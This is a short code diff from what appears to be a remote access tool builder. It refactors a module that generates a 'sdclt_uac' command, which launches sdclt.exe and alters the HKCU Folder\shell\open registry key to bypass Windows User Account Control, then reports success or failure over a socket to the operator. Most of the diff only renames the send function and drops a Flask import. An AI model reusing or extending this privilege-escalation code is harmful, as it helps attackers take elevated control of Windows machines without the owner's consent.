@@ -1,10 +1,10 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
+
 
 def main(option):
     if option == 'generate':
@@ -26,9 +26,9 @@ def sdclt_uac(data):
         startfile('C:\\WINDOWS\\system32\\sdclt.exe')
         sleep(2)
         winreg.DeleteKey(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\Folder\\shell\open'), 'command')
-        main_send('[+]Attempted to get executable to bypass UAC through sdclt.exe', s)
+        send_all(s,'[+]Attempted to get executable to bypass UAC through sdclt.exe')
     else:
-        main_send('[-]Executable remote filepath does not exist', s)
+        send_all(s,'[-]Executable remote filepath does not exist')
 ''')
         config.logics.append('''
             elif command == "sdclt_uac":
